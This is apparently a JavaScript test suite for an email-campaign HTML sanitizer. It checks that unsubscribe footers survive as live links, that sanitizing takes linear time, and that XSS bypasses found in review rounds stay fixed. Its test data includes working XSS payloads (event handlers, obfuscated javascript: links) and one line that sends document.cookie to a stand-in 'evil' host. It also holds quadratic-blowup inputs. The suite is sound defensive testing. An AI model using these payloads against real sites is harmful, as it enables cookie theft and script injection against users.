    expect(sanitizeCampaignHtml('<p>@@UN1T@@UN1T__STYLE_0@@</p>')).not.toContain('@@UN1T_')
    expect(sanitizeCampaignHtml('<p>@@UN1T@@UN1T@@UN1T___STYLE_0@@</p>')).not.toContain('@@UN1T_')
  })
})

describe('sanitizeCampaignHtml — <title> and <noframes> (round-4 footer swallowers)', () => {
  it('strips an unclosed <title>, which is RCDATA in the body too', () => {
    const out = sanitizeCampaignHtml('<p>x</p><title>hidden footer')
    expect(out).not.toMatch(/<title/i)
    expect(out).toBe('<p>x</p>hidden footer') // the TAG goes, its text stays
  })

  it('strips an unclosed <noframes>', () => {
    const out = sanitizeCampaignHtml('<p>x</p><noframes>hidden footer')
    expect(out).not.toMatch(/<noframes/i)
    expect(out).toBe('<p>x</p>hidden footer')
  })

  it('strips the closing forms too, keeping the inner text', () => {
    expect(sanitizeCampaignHtml('<title>a</title><noframes>b</noframes>')).toBe('ab')
  })
})

describe('sanitizeCampaignHtml — unterminated comments (round-4)', () => {
  it('deletes a dangling <!-- that would swallow everything after it', () => {
    expect(sanitizeCampaignHtml('<p>Sale!</p><!--')).toBe('<p>Sale!</p>')
    expect(sanitizeCampaignHtml('<p>Sale!</p><!-- x')).toBe('<p>Sale!</p>')
  })

  it('leaves BALANCED comments alone', () => {
    expect(sanitizeCampaignHtml('<!-- a --><p>k</p>')).toBe('<!-- a --><p>k</p>')
    expect(sanitizeCampaignHtml('<p>k</p><!-- trailing note -->')).toBe('<p>k</p><!-- trailing note -->')
  })

  it('deletes only the LAST, unterminated opener — earlier balanced ones survive', () => {
    expect(sanitizeCampaignHtml('<!-- a --><p>k</p><!-- b')).toBe('<!-- a --><p>k</p>')
  })

  it('accepts the abrupt close --!> as terminating a comment', () => {
    expect(sanitizeCampaignHtml('<p>k</p><!-- a --!>')).toBe('<p>k</p><!-- a --!>')
  })

  it('a comment opener INSIDE a tag is part of the tag name, and welds nothing', () => {
    // `<scr<!--ipt>` is ONE element named `scr<!--ipt` to parse5 and to every
    // browser: the `<!--` is not a comment opener, because inside a tag only
    // `>` ends the tag. Round 5 cut the tag at the `<!--`, took it for a
    // dangling comment and tail-deleted; the deletion could not weld anything
    // (nothing follows a tail deletion), but the reading was wrong, and the
    // same wrong reading in a quoted value was the round-6 critical.
    const out = sanitizeCampaignHtml('<p>ok</p><scr<!--ipt>alert(1)')
    expect(out).not.toContain('<script')
    expect(parsedElements(out)).not.toContain('script')
    expect(out).toContain('<p>ok</p>')
    expectSafeBothPaths('<p>ok</p><scr<!--ipt>alert(1)')
  })
})

describe('sanitizeCampaignHtml — Outlook conditional comments survive (round-4 fidelity)', () => {
  it('keeps the <style> inside <!--[if mso]>…<![endif]-->', () => {
    // The standard Unlayer/Outlook export pattern. Scanning it as an ordinary
    // comment stranded the placeholder and deleted the whole mso stylesheet.
    const out = sanitizeCampaignHtml('<!--[if mso]><style>.a{color:red}</style><![endif]--><p>x</p>')
    expect(out).toContain('<style>.a{color:red}</style>')
    expect(out).toContain('<!--[if mso]>')
    expect(out).toContain('<![endif]-->')
  })

  it('keeps it with the downlevel-revealed <!--<![endif]--> close too', () => {
    const out = sanitizeCampaignHtml('<!--[if mso]><style>.a{color:red}</style><!--<![endif]--><p>x</p>')
    expect(out).toContain('<style>.a{color:red}</style>')
  })

  it('keeps a <style> that follows an abruptly-closed comment', () => {
    const out = sanitizeCampaignHtml('<!-- draft --!><style>.b{color:red}</style><p>x</p>')
    expect(out).toContain('<style>.b{color:red}</style>')
  })

  it('but an ORDINARY comment still swallows its placeholder — the style is dropped', () => {
    const out = sanitizeCampaignHtml('<!-- hide <style>.c{color:red}</style> --><p>x</p>')
    expect(out).not.toContain('<style')
    expect(out).not.toContain('color:red')
    expect(out).toContain('<p>x</p>')
  })
})

describe('sanitizeCampaignHtml — quotes only open a value after `=` (round-4)', () => {
  it('a stray quote in attribute-name position does not flip the scan out of the tag', () => {
    // Tracking parity on EVERY quote desynchronised the scan from a real
    // tokenizer: here the first `"` (part of the unquoted value `x"`) opened a
    // phantom value and the `>` inside `y="z>AAA"` then read as closing the
    // <a>. The spec states it without a special case: a quote opens a value
    // only in BEFORE_ATTR_VALUE. The whole run is ONE anchor whose third
    // attribute value is the unquoted text `<style>a{color:red}</style>`, so no
    // stylesheet exists to be restored anywhere.
    const body = '<a href=x" y="z>AAA" BBB=<style>a{color:red}</style> >L'
    const out = sanitizeCampaignHtml(body)
    expect(parsedElements(out)).not.toContain('style')
    expect(parsedElements(out)).toContain('a')
    expectSafeBothPaths(body)
  })

  it('a normally-quoted attribute value still shields its > from the scan', () => {
    // The round-3 false negative must stay fixed: `=`-gating must not stop
    // legitimate quoted values from being recognised.
    const out = sanitizeCampaignHtml('<img title="a>b" style="<style>a{color:red}</style>">')
    expect(out).not.toContain('<style')
    expect(out).toContain('title="a>b"')
  })

  it('whitespace between = and the quote still opens a value', () => {
    // `title = "a>b"` is a quoted value, so its `>` does not end the tag and
    // the `alt` value that follows is inert text inside an attribute — not a
    // <style> element.
    const out = sanitizeCampaignHtml('<img title = "a>b" alt="<style>a{color:red}</style>">')
    expect(parsedElements(out)).not.toContain('style')
    expect(parsedAttributes(out).map((a) => a.name).sort()).toEqual(['alt', 'title'])
  })
})

// ---------------------------------------------------------------------------
// The footer is checked with a REAL PARSER, not a substring search.
//
// Every earlier footer test asserted `html.toContain('Unsubscribe')`, which is
// exactly the assertion that cannot see this bug class: an unclosed
// `<plaintext>` / `<title>` / `<!--` leaves the footer present in the SOURCE
// and inert in the DOM — the text is there, the link is not. parse5 answers
// the question that matters: does a live <a href="<unsub>"> element exist?
// ---------------------------------------------------------------------------
describe('renderHostCampaignHtml — the unsubscribe link survives as a LIVE DOM element', () => {
  const UNSUB = 'https://crm.test/unsubscribe/host/tok.sig'
  const host = { name: 'Acme Events', sender_name: 'Acme Team' }

  // EXACTLY ONE live anchor, with clean ancestors (round-6 finding 5): "at
  // least one" cannot see a duplicated footer, and no ancestor check counted a
  // link inside <script>/<title>/<textarea> as live.
  const hasLiveUnsubLink = (html, href = UNSUB) => hasExactlyOneLiveUnsubLink(html, href)

  it('the helper says NO to a DUPLICATED footer and to an inert ancestor', () => {
    // The two things "at least one live anchor" could never see.
    const link = `<a href="${UNSUB}">Unsubscribe</a>`
    expect(hasLiveUnsubLink(`<p>x</p>${link}`)).toBe(true)
    expect(hasLiveUnsubLink(`<p>x</p>${link}${link}`)).toBe(false)
    expect(hasLiveUnsubLink(`<p>x</p><title>${link}</title>`)).toBe(false)
    expect(hasLiveUnsubLink(`<p>x</p><textarea>${link}</textarea>`)).toBe(false)
  })

  it('the helper is a real detector — it says NO when the footer is swallowed', () => {
    // Negative control. Without it, nine green assertions below would prove
    // nothing: a helper that always returned true would pass every one.
    const swallowed = `<html><body><p>hi</p><plaintext><a href="${UNSUB}">Unsubscribe</a></body></html>`
    expect(hasLiveUnsubLink(swallowed)).toBe(false)
    expect(swallowed).toContain('Unsubscribe') // …which the old substring test happily accepted
  })

  // Every construct that opens a "stop parsing markup" mode, unclosed.
  const SWALLOWERS = ['<plaintext>', '<textarea>', '<title>', '<noframes>', '<xmp>', '<!--', '<!-- x', '<script>', '<style>']

  for (const trap of SWALLOWERS) {
    it(`shell path — a body ending in an unclosed ${trap} still ships a live unsubscribe link`, () => {
      const html = renderHostCampaignHtml({
        host, subject: 's', bodyHtml: `<p>hi</p>${trap}`, unsubscribeUrl: UNSUB,
      })
      expect(hasLiveUnsubLink(html)).toBe(true)
    })

    it(`full-document path — a body ending in an unclosed ${trap} still ships a live unsubscribe link`, () => {
      const html = renderHostCampaignHtml({
        host, subject: 's',
        bodyHtml: `<!DOCTYPE html><html><body><p>hi</p>${trap}</body></html>`,
        unsubscribeUrl: UNSUB,
      })
      expect(hasLiveUnsubLink(html)).toBe(true)
    })
  }

  it('an ordinary body ships one too (the baseline the traps are measured against)', () => {
    expect(hasLiveUnsubLink(renderHostCampaignHtml({ host, subject: 's', bodyHtml: '<p>hi</p>', unsubscribeUrl: UNSUB }))).toBe(true)
    expect(hasLiveUnsubLink(renderHostCampaignHtml({
      host, subject: 's', bodyHtml: '<!DOCTYPE html><html><body><p>hi</p></body></html>', unsubscribeUrl: UNSUB,
    }))).toBe(true)
  })
})

describe('renderHostCampaignHtml — the `sanitized` flag (send-queue hoist)', () => {
  const host = { name: 'Acme', sender_name: 'Acme' }
  const UNSUB = 'https://crm.test/u/t'

  it('defaults to false: an unflagged body IS sanitized', () => {
    const html = renderHostCampaignHtml({ host, subject: 's', bodyHtml: '<p onclick="x()">Hi</p><script>steal()</script>', unsubscribeUrl: UNSUB })
    expect(html).not.toContain('steal()')
    expect(html).not.toMatch(/onclick/i)
  })

  it('sanitized:true uses the body as-is — and sanitizing is idempotent, so the two agree', () => {
    // The queue sanitizes once per chunk and renders per recipient. The flag
    // is a cost saving, never a security decision: the same input rendered
    // both ways must produce the same document.
    const raw = '<p onclick="x()">Hi</p><script>steal()</script><style>.a{color:red}</style>'
    const viaFlag = renderHostCampaignHtml({ host, subject: 's', bodyHtml: sanitizeCampaignHtml(raw), sanitized: true, unsubscribeUrl: UNSUB })
    const viaRender = renderHostCampaignHtml({ host, subject: 's', bodyHtml: raw, unsubscribeUrl: UNSUB })
    expect(viaFlag).toBe(viaRender)
    expect(viaFlag).not.toContain('steal()')
  })

  it('agrees with the inline path on the FULL-DOCUMENT branch too', () => {
    // The Unlayer branch is chosen by sniffing bodyHtml for a doctype/<html>,
    // so the flag must not change which branch a body takes: the queue would
    // otherwise ship a differently-shaped email than the preview the host
    // approved. Sanitizing leaves the doctype alone, which is why they agree.
    const doc = '<!DOCTYPE html><html><head><title>t</title></head><body><p onclick="x()">Hi</p><script>steal()</script></body></html>'
    const viaFlag = renderHostCampaignHtml({ host, subject: 's', bodyHtml: sanitizeCampaignHtml(doc), sanitized: true, unsubscribeUrl: UNSUB })
    const viaRender = renderHostCampaignHtml({ host, subject: 's', bodyHtml: doc, unsubscribeUrl: UNSUB })
    expect(viaFlag).toBe(viaRender)
    expect(viaFlag).toContain('</body>') // took the inject-before-</body> branch, not the shell
    expect(viaFlag).not.toContain('steal()')
  })

  it('the two paths agree even when the doctype only APPEARS after sanitizing (round-5)', () => {
    // The branch used to be chosen by sniffing the RAW body, and the queue
    // hands in an already-sanitized one — so the same campaign could take
    // DIFFERENT branches on the two paths. Here the doctype sits past the
    // 500-char sniff window behind a <script> block: the composer preview and
    // the test send saw "not a document" and rendered the branded shell, the
    // queue saw the sanitized body (script gone, doctype first) and sent the
    // bare document. The host approved one email and the list got another.
    // The renderer now sanitizes FIRST and sniffs the sanitized text, so the
    // input to the sniff is identical on both paths.
    const bodyHtml = '<script>' + 'A'.repeat(600) + '</script><!DOCTYPE html><html><body><p>Hi</p></body></html>'
    const viaRender = renderHostCampaignHtml({ host, subject: 's', bodyHtml, unsubscribeUrl: UNSUB })
    const viaFlag = renderHostCampaignHtml({ host, subject: 's', bodyHtml: sanitizeCampaignHtml(bodyHtml), sanitized: true, unsubscribeUrl: UNSUB })
    expect(viaFlag).toBe(viaRender)
    // …and BOTH take the full-document branch, because that is what the body
    // sanitizes down to.
    expect(viaRender.startsWith('<!DOCTYPE html><html><body><p>Hi</p>')).toBe(true)
    expect(viaRender).toContain('Unsubscribe')
    expect(viaRender).not.toContain('AAAA')
  })

  it('the footer is injected even when the caller pre-sanitized', () => {
    const html = renderHostCampaignHtml({ host, subject: 's', bodyHtml: sanitizeCampaignHtml('<p>hi</p><plaintext>'), sanitized: true, unsubscribeUrl: UNSUB })
    expect(html).toContain('Unsubscribe')
    expect(html).not.toMatch(/<plaintext/i)
  })
})

// ---------------------------------------------------------------------------
// ROUND-5 SECURITY REVIEW — three findings, three describes.
//
// 1. every pass of the sanitizer is LINEAR (it was quadratic, and a host could
//    buy 94 seconds of server CPU with one 300 KB preview);
// 2. an UNTERMINATED tag survives verbatim and the injected footer supplies
//    its `>`, which puts the unsubscribe anchor inside a <script> text node;
// 3. the comment rules mishandled a `<!--` inside a quoted attribute value and
//    the two abrupt-closing comment forms.
// ---------------------------------------------------------------------------

describe('sanitizeCampaignHtml — one pass is LINEAR (round-5 DoS)', () => {
  // /api/host/emails/preview caps a body at 300,000 characters, so these are
  // the worst inputs an authenticated host can actually post.
  //
  // THE BOUND IS DELIBERATELY LOOSE. Every case below runs in 5-55 ms on a
  // 2024 laptop; the assertion is 1,500 ms, roughly 30x the slowest, because a
  // shared CI runner under load is not a benchmark and a flaky timing test
  // gets deleted rather than fixed. What it has to catch is the QUADRATIC —
  // the same inputs measured 8.4s, 6.8s, 4.6s and 94s before the tokenizer —
  // and two orders of magnitude of headroom still catches that.
  const CAP = 300_000
  const BUDGET_MS = 1500
  const fill = (unit) => unit.repeat(Math.ceil(CAP / unit.length)).slice(0, CAP)
  const msFor = (html) => {
    const started = performance.now()
    sanitizeCampaignHtml(html)
    return performance.now() - started
  }

  // Ten inner passes in ONE outer round: each `<sc…ript>` layer only becomes a
  // real tag once the layer inside it is deleted, so the fixed point has to
  // re-scan the whole document ten times. Quadratic x 10 was the 94s case.
  const chainPrefix = (() => {
    let c = '<script>'
    for (let i = 0; i < 9; i++) c = '<sc' + c + 'ript>'
    return c
  })()
  // Multiple OUTER rounds: every unit strands a <style> placeholder inside an
  // open tag, the drop welds `onerror=` back together, and the next round has
  // to strip it.
  const weldUnit = '<img src=x on<style>a{color:red}</style>error=alert(1)>'

  const CASES = [
    ['many <script openers, no `>` anywhere (8.4s before)', fill('<script ')],
    ['many <script> openers, no closer (1.7s before)', fill('<script>')],
    ['many <style> openers, no closer', fill('<style>')],
    ['many openers sharing ONE far `>` (4.6s before)', '<meta x'.repeat(42_000) + '>'],
    ['many conditional openers sharing ONE `-->`', '<!--[if mso]>'.repeat(23_000) + '-->'],
    ['many <svg openers (6.8s before)', fill('<svg ')],
    ['ten inner passes, then a <script tail (94s before)', chainPrefix + '<script '.repeat(Math.floor((CAP - chainPrefix.length) / 8))],
    ['a placeholder-drop weld chain (multiple OUTER rounds)', weldUnit.repeat(Math.floor(CAP / weldUnit.length))],
    ['many openers, one far `>`, quotes never opened', '<a x'.repeat(75_000) + '>'],
    ['many unclosed quoted values', '<a q="'.repeat(50_000)],
    ['many comment openers', '<!-- '.repeat(60_000)],
    ['300 KB of perfectly ordinary tags', '<td a=1>'.repeat(37_500)],
  ]

  for (const [name, html] of CASES) {
    it(`${name} — under ${BUDGET_MS}ms`, () => {
      expect(msFor(html)).toBeLessThan(BUDGET_MS)
    })
  }

  it('a closer shared by N openers is searched for ONCE, not N times', () => {
    // The absolute bounds above cannot see this one on their own: with the
    // closer memo removed, 23,000 conditional openers sharing a single `-->`
    // cost 615ms against 9ms — 65x worse, and still inside a bound loose
    // enough not to flake on CI. The SHAPE gives it away instead: quadratic
    // work QUADRUPLES when the input doubles, and a ratio compares two
    // measurements on the same machine, so a slow runner moves both.
    const unit = '<!--[if mso]>'
    const best = (n) => {
      const html = unit.repeat(Math.floor(n / unit.length)) + '-->'
      let ms = Infinity
      for (let i = 0; i < 3; i++) ms = Math.min(ms, msFor(html))
      return Math.max(ms, 0.05) // never divide by a zero-length measurement
    }
    best(75_000) // warm the JIT before either measurement counts
    const small = best(75_000)
    const big = best(300_000)
    // 4x the input: linear costs about 4x, quadratic about 16x.
    expect(big / small).toBeLessThan(8)
  })
})

// ---------------------------------------------------------------------------
// An UNTERMINATED open tag used to survive VERBATIM: `<p>hi</p><script `
// sanitized to itself, and the render shell then handed it the `>` out of the
// server-injected footer. The host name, the unsubscribe anchor and the
// consent line all ended up inside a <script> text node — present in the
// source, absent from the DOM, which is why these parse instead of grepping.
//
// The nine traps in the describe above this one are all TERMINATED
// (`'<script>'`, not `'<script '`), which is exactly why the suite was green.
// ---------------------------------------------------------------------------
describe('renderHostCampaignHtml — an UNTERMINATED tag cannot eat the footer (round-5)', () => {
  const UNSUB = 'https://crm.test/unsubscribe/host/tok.sig'
  const host = { name: 'Acme Events', sender_name: 'Acme Team' }

  const hasLiveUnsubLink = (html, href = UNSUB) => hasExactlyOneLiveUnsubLink(html, href)
  const shellOf = (bodyHtml) => renderHostCampaignHtml({ host, subject: 's', bodyHtml, unsubscribeUrl: UNSUB })
  const docOf = (bodyHtml) => renderHostCampaignHtml({
    host, subject: 's', bodyHtml: `<!DOCTYPE html><html><body><p>hi</p>${bodyHtml}</body></html>`, unsubscribeUrl: UNSUB,
  })

  it('the detector still says NO when the footer really is swallowed', () => {
    // Negative control: without it every green assertion below proves nothing.
    const swallowed = `<html><body><p>hi</p><script <a href="${UNSUB}">Unsubscribe</a></body></html>`
    expect(hasLiveUnsubLink(swallowed)).toBe(false)
    expect(swallowed).toContain('Unsubscribe') // …which a substring test accepts
  })

  // Every construct that opens a "stop parsing markup" mode, left UNTERMINATED
  // — no `>` at all, so the next `>` in the document is the footer's.
  const UNTERMINATED = [
    '<script ', '<script/', '<style ', '<style x', '<title ', '<title x="y',
    '<textarea ', '<plaintext ', '<xmp ', '<noframes ', '<noscript ', '<iframe ', '<template ',
  ]

  for (const trap of UNTERMINATED) {
    it(`shell path — a body ending in ${JSON.stringify(trap)} still ships a live unsubscribe link`, () => {
      expect(hasLiveUnsubLink(shellOf(`<p>hi</p>${trap}`))).toBe(true)
    })
    it(`full-document path — a body ending in ${JSON.stringify(trap)} still ships a live unsubscribe link`, () => {
      expect(hasLiveUnsubLink(docOf(trap))).toBe(true)
    })
  }

  it('jsdom agrees with parse5 on the <script case, both paths', () => {
    // Two independent parsers, because the bug is "the source says
    // Unsubscribe and the DOM has no anchor" and one parser could be wrong.
    for (const html of [shellOf('<p>hi</p><script '), docOf('<script ')]) {
      const { window } = new JSDOM(html)
      expect(window.document.querySelector(`a[href="${UNSUB}"]`)).not.toBeNull()
      expect(html).toContain('Unsubscribe')
    }
  })

  it('an unclosed <select> does not delete the anchor (parse5 "in select" mode)', () => {
    // Nothing here is unterminated — `<select>` is a perfectly well-formed
    // tag. It is the INSERTION MODE that kills the footer: parse5 and every
    // browser ignore an `<a>` while "in select", so the anchor vanished from
    // the document with the source untouched. select/option/optgroup are on
    // the strip list for that.
    expect(hasLiveUnsubLink(docOf('<select><option>Pick one'))).toBe(true)
    expect(hasLiveUnsubLink(shellOf('<p>hi</p><select><option>Pick one'))).toBe(true)
    expect(sanitizeCampaignHtml('<p>hi</p><select><option>a</option>')).toBe('<p>hi</p>a')
  })

  it('an UNTERMINATED QUOTED VALUE is dropped like an unterminated tag', () => {
    // The fuzz found this one, and no hand-written case in this file reached
    // it: `='` opens an attribute value that never closes, so a browser runs
    // to EOF inside the tag and DROPS it — while the sanitizer kept it, and
    // the footer (appended in the shell, injected before `</body>` in the
    // document) landed inside that open quote. Both paths lost the anchor.
    // ROUND 6: this particular body is no longer unterminated. `='"<!--[if` is
    // an ATTRIBUTE NAME (an `=` in before-attribute-name position starts a
    // name, and `<` and `'` are ordinary characters in one), so the tag closes
    // at its `>` and only the dangling `<!--` after it is tail-deleted. What
    // has to stay true is what the test was written for: a live unsubscribe
    // anchor on both paths.
    const body = `<img src=x ='"<!--[if mso]><!--<!--[if mso]>`
    expect(sanitizeCampaignHtml(body)).toBe(`<img src=x ='"<!--[if mso]>`)
    expect(hasLiveUnsubLink(shellOf(body))).toBe(true)
    expect(hasLiveUnsubLink(docOf(body))).toBe(true)
    // The genuinely unterminated shape — a quoted value with no closing quote
    // — is still dropped whole, which is what a browser does.
    expect(sanitizeCampaignHtml(`<p>hi</p><img src=x alt='`)).toBe('<p>hi</p>')
    // The plain shape, pinned directly: the tag goes, the host's real content
    // before it stays.
    expect(sanitizeCampaignHtml("<p>hi</p><a title='x")).toBe('<p>hi</p>')
    expect(sanitizeCampaignHtml('<p>hi</p><a title="x')).toBe('<p>hi</p>')
    expect(sanitizeCampaignHtml('<p>hi</p><b c=d')).toBe('<p>hi</p>')
  })

  it('a partial tag keeps its attributes SCRUBBED, not as authored', () => {
    // `<a href=javascript:<p>` is a tag cut short by the `<p`; a browser reads
    // its href as `javascript:<p`, so leaving the partial as authored shipped
    // a live javascript: link. (Also found by the fuzz.)
    const out = sanitizeCampaignHtml('<a href=javascript:<p>KEEPME</p>')
    expect(out).not.toMatch(/javascript:/i)
    expect(out).toContain('href="#"')
    expect(out).toContain('KEEPME')
  })

  it('a `"` inside an UNQUOTED attribute value does not open a quoted value', () => {
    // `<a href=alert(1)="…>` — the second `=` and the `"` are ordinary
    // characters inside an unquoted value, so the tag ends at its `>`. Reading
    // them as opening a quoted value ran the scan past that `>` and left a tag
    // with an unbalanced quote for the footer to fall into.
    const out = sanitizeCampaignHtml('<a href=x="y" title=z>keep</a>')
    expect(out).toContain('keep')
    expect(out).toContain('title=z')
  })

  it('an ordinary body still ships one (the baseline the traps are measured against)', () => {
    expect(hasLiveUnsubLink(shellOf('<p>hi</p>'))).toBe(true)
    expect(hasLiveUnsubLink(docOf('<p>bye</p>'))).toBe(true)
  })
})

describe('sanitizeCampaignHtml — comment openers come from the tokenizer walk (round-5)', () => {
  it('a `<!--` inside a QUOTED attribute value is literal text, not a comment opener', () => {
    // The raw `lastIndexOf('<!--')` saw a dangling comment here and deleted
    // the rest of the message. To a browser that `<!--` is part of the title
    // value and nothing after it is inside a comment.
    const html = '<a href="/x" title="a<!--b">Link</a><p>KEEPME</p>'
    expect(sanitizeCampaignHtml(html)).toBe(html)
  })

  it('`<!-->` and `<!--->` are COMPLETE comments (abrupt closing), not danglers', () => {
    // Per the tokenizer's comment-start / comment-start-dash states, both of
    // these close immediately. The old rule treated them as unterminated and
    // tail-deleted everything after them.
    expect(sanitizeCampaignHtml('<p>a</p><!--><p>KEEPME</p>')).toBe('<p>a</p><!--><p>KEEPME</p>')
    expect(sanitizeCampaignHtml('<p>a</p><!---><p>KEEPME</p>')).toBe('<p>a</p><!---><p>KEEPME</p>')
  })

  it('a conditional opener with NO closer is still tail-deleted, and that is CORRECT', () => {
    // Not a fidelity bug to be fixed later: `<!--[if mso]` with no `-->` after
    // it is an UNTERMINATED COMMENT in every client that is not Outlook, so
    // everything after it — including the footer the send path exists to
    // guarantee — would be swallowed there. Pinned so it is not "fixed".
    expect(sanitizeCampaignHtml('<!--[if mso]<style>evil{x:y}</style>')).toBe('')
    // …while the properly closed form keeps its Outlook stylesheet.
    expect(sanitizeCampaignHtml('<!--[if mso]><style>.a{color:red}</style><![endif]--><p>x</p>'))
      .toContain('<style>.a{color:red}</style>')
  })

  it('a balanced comment survives, and its contents are still stripped', () => {
    expect(sanitizeCampaignHtml('<p>a</p><!-- x --><p>b</p>')).toBe('<p>a</p><!-- x --><p>b</p>')
    expect(sanitizeCampaignHtml('<!-- draft <script>evil()</script> --><p>x</p>')).toBe('<!-- draft  --><p>x</p>')
  })

  it('a genuinely dangling comment is still tail-deleted', () => {
    expect(sanitizeCampaignHtml('<p>Sale!</p><!--')).toBe('<p>Sale!</p>')
    expect(sanitizeCampaignHtml('<p>Sale!</p><!-- half a thought')).toBe('<p>Sale!</p>')
  })
})

// ---------------------------------------------------------------------------
// ROUND 6. The tag scanner returned a PARTIAL TAG at any inner `<`, INCLUDING
// one inside a quoted attribute value, and that was a live critical XSS:
//
//   <img src=x onerror="alert(document.domain);'<a'">
//
// sanitized to ITSELF. The cut left the handler's value with no closing quote,
// so ON_ATTR_DQ (which needs one) did not match; ON_ATTR_BARE refuses a
// leading quote; and URL_ATTR's bare alternative produced a value starting
// with `"`, whose scheme check therefore said "relative" and kept it. The
// whole family below was live, on both render paths, in parse5 and in jsdom.
//
// The fix is the tokenizer: inside a tag only `>` ends the tag, so the
// attribute rules always see a COMPLETE attribute — and the rules now read the
// tokenizer's attribute spans instead of pattern-matching the tag's text, so
// an attribute whose name a regex cannot describe is still seen.
//
// EVERY ASSERTION HERE IS ON A PARSED DOCUMENT (finding 5). A substring test
// is what let this ship.
// ---------------------------------------------------------------------------
describe('sanitizeCampaignHtml — a `<` inside a quoted attribute value (round-6 critical)', () => {
  const Q = String.fromCharCode(34)
  const SQ = String.fromCharCode(39)

  // Every reproducer from the round-6 review, verbatim.
  const PAYLOADS = [
    ['onerror, value broken out with <a', `<img src=x onerror=${Q}alert(document.domain);${SQ}<a${SQ}${Q}>`],
    ['onerror, line-comment form', `<img src=x onerror=${Q}alert(1)//</b${Q}>`],
    ['onclick on a div', `<div onclick=${Q}alert(document.domain);${SQ}<a${SQ}${Q}>x</div>`],
    ['onload exfiltrating cookies', `<img src=x onload=${Q}fetch(${SQ}//evil/${SQ}+document.cookie);${SQ}<a${SQ}${Q}>`],
    ['javascript: href', `<a href=${Q}javascript:alert(1);${SQ}<b${SQ}${Q}>click</a>`],
    ['javascript: img src', `<img src=${Q}javascript:alert(1);${SQ}<b${SQ}${Q}>`],
    ['javascript: td background', `<td background=${Q}javascript:alert(1);${SQ}<b${SQ}${Q}>`],
    ['javascript: video poster', `<video poster=${Q}javascript:alert(1);${SQ}<b${SQ}${Q}>`],
    ['javascript: button formaction', `<button formaction=${Q}javascript:alert(1);${SQ}<b${SQ}${Q}>`],
    ['uppercase tag and attribute', `<IMG SRC=x ONERROR=${Q}alert(1);${SQ}<a${SQ}${Q}>`],
    ['whitespace around the =', `<img src=x onerror = ${Q}alert(1);${SQ}<a${SQ}${Q}>`],
    ['slash-separated handler', `<img/onerror=${Q}alert(1);${SQ}<a${SQ}${Q}>`],
    ['entity-encoded scheme', `<a href=${Q}&#106;avascript:alert(1);${SQ}<b${SQ}${Q}>c</a>`],
    ['mixed-case scheme', `<a href=${Q}jAvAsCrIpT:alert(1);${SQ}<b${SQ}${Q}>c</a>`],
    ['single-quoted value hiding a "', `<img src=x onerror=${SQ}alert(1);${Q}<a${Q}${SQ}>`],
    ['handler abutting the next attribute', `<img src="x"onerror=${Q}alert(1);${SQ}<a${SQ}${Q}>`],
    ['handler inside a full-document export', `<!DOCTYPE html><html><body><img src=x onerror=${Q}alert(1);${SQ}<a${SQ}${Q}></body></html>`],
  ]

  for (const [name, body] of PAYLOADS) {
    it(`${name} — no live handler and no live scheme survives, on either render path`, () => {
      const out = sanitizeCampaignHtml(body)
      // 1. The sanitizer changed something (every one of these was a no-op).
      expect(out).not.toBe(body)
      // 2. Idempotent.
      expect(sanitizeCampaignHtml(out)).toBe(out)
      // 3. PARSED: no on* attribute, no scheme outside the allowlist.
      expect(handlerAttrs(out)).toEqual([])
      expect(badSchemeAttrs(out)).toEqual([])
      // 4. And on both render paths, with parse5 AND jsdom, the whole
      //    invariant — including the one live unsubscribe anchor.
      expectSafeBothPaths(body, { jsdom: true })
    })
  }

  it('the handler is gone from the DOM, not merely from the string', () => {
    // The negative control for the table above: jsdom is asked directly.
    const body = `<img src=x onerror=${Q}alert(document.domain);${SQ}<a${SQ}${Q}>`
    for (const html of Object.values(renderBothPaths(body))) {
      const { window } = new JSDOM(html)
      expect(window.document.querySelector('[onerror]')).toBeNull()
      expect(window.document.querySelectorAll('img').length).toBeGreaterThan(0)
    }
    // …and the detector is real: it finds the handler in the RAW payload.
    expect(new JSDOM(`<body>${body}</body>`).window.document.querySelector('[onerror]')).not.toBeNull()
  })

  it('the tokenizer keeps the WHOLE quoted value in one attribute', () => {
    // The boundary itself, asserted directly: with the round-5 rule the tag
    // ended at the `<a` and everything after it was re-read as attribute-name
    // position, which is what made the handler unrecognisable to a regex that
    // needed a closing quote.
    const input = `<img src=x onerror=${Q}alert(1);${SQ}<a${SQ}${Q} alt=${Q}z${Q}>`
    const [tag] = markupTagSpans(input)
    expect(markupTagSpans(input)).toHaveLength(1)
    expect(tag.end).toBe(input.length)
    expect(tag.attrs.map((a) => input.slice(a.nameStart, a.nameEnd))).toEqual(['src', 'onerror', 'alt'])
    expect(input.slice(tag.attrs[1].valueStart, tag.attrs[1].valueEnd)).toBe(`alert(1);${SQ}<a${SQ}`)
  })

  it('a legitimate quoted value containing a `<` is still kept verbatim', () => {
    // The fidelity side of the same rule: `<` in a value is ordinary text, and
    // ordinary marketing copy uses it.
    const html = '<img src="https://acme.ie/a.png" alt="5 < 6 seats left" title="a<b">'
    expect(sanitizeCampaignHtml(html)).toBe(html)
  })
})

// ---------------------------------------------------------------------------
// ROUND 6, FINDING 2. Tag-name position kept `=` as a terminator, and a real
// tokenizer does not: only whitespace, `/` and `>` end a tag name. So
//
//   <s=<x='><!--</>
//
// is ONE element named `s=<x='` followed by a comment that never closes — to
// parse5, to jsdom and to every browser — while the sanitizer entered a
// phantom single-quoted value, never offered the `<!--` to the comment rule
// and emitted the run verbatim. The footer injected after it landed inside
// that phantom quote: ZERO live `a[href]` in the parsed document on both
// paths, with the word "Unsubscribe" still in the source. 0.6% of random fuzz
// bodies hit this family.
// ---------------------------------------------------------------------------
describe('sanitizeCampaignHtml — `=` belongs to the TAG NAME (round-6 finding 2)', () => {
  const SQ = String.fromCharCode(39)
  const FAMILY = [
    '<s=<x=' + SQ + '><!--</>',
    '<s=<img src=x =' + SQ + '"<!--[if mso]><!--</body>' + SQ,
    '<a=<b=' + SQ + '>text',
    '<p=<q=' + SQ + '><!--',
    '<s=<x=' + SQ + '></s=<x=' + SQ + '>',
    '<div=<span=' + SQ + '>hi</div>',
  ]

  for (const body of FAMILY) {
    it(`${JSON.stringify(body)} — still ships exactly one live unsubscribe anchor`, () => {
      expectSafeBothPaths(body, { jsdom: true })
    })
  }

  it('the element really is named `s=<x=` + a quote, which is what parse5 says too', () => {
    // Pinned as a positive fact, not only as "nothing broke": the walk agrees
    // with the parser about what this run IS.
    const body = '<s=<x=' + SQ + '><!--</>'
    expect(parsedElements(sanitizeCampaignHtml(body))).toContain('s=<x=' + SQ)
    expect(markupTagSpans(body).map((t) => [t.start, t.end, t.name])).toEqual([[0, 8, 's=<x=' + SQ]])
  })
})

// ---------------------------------------------------------------------------
